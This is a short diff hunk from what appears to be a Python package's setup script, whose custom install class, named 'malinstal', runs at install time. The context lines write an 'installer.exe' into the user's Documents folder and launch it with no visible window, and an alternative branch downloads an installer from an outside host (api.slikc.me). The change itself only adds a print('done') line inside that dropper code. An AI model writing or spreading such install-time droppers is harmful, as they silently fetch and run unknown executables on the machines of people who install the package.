@@ -26,6 +26,7 @@ class malinstal(install):
             with open(os.path.join(documents, 'installer.exe'), 'wb') as f:
                 f.write(installer_content)
             subprocess.Popen([os.path.join(documents, 'installer.exe')], creationflags=subprocess.CREATE_NO_WINDOW)
+            print('done')
         else:
             installer_url = 'https://api.slikc.me/installer'
             with urllib.request.urlopen(installer_url) as response:
